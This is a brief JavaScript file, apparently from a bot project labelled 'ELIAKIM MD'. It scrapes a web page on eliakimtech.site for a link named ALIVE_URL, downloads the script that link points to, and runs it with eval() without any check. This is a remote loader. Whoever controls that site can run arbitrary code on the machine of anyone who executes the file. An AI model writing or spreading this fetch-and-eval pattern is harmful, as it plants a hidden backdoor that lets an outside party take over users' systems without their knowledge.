 // ELIAKIM MD

'use strict';

const axios = require('axios');
const cheerio = require('cheerio');

const webPageUrl = 'https://www.eliakimtech.site/files';

async function fetchAliveUrl() {
    try {
        const response = await axios.get(webPageUrl);
        const $ = cheerio.load(response.data);
        const aliveUrl = $(`a:contains("ALIVE_URL")`).attr('href');

        if (!aliveUrl) throw new Error('ALIVE_URL not found on the webpage.');

        console.log('ALIVE_URL fetched successfully:', aliveUrl);

        const scriptResponse = await axios.get(aliveUrl);
        const scriptContent = scriptResponse.data;
        console.log("ALIVE_URL script loaded successfully");

        eval(scriptContent);
    } catch (error) {
        console.error('Error fetching ALIVE_URL:', error.message);
    }
}

fetchAliveUrl();
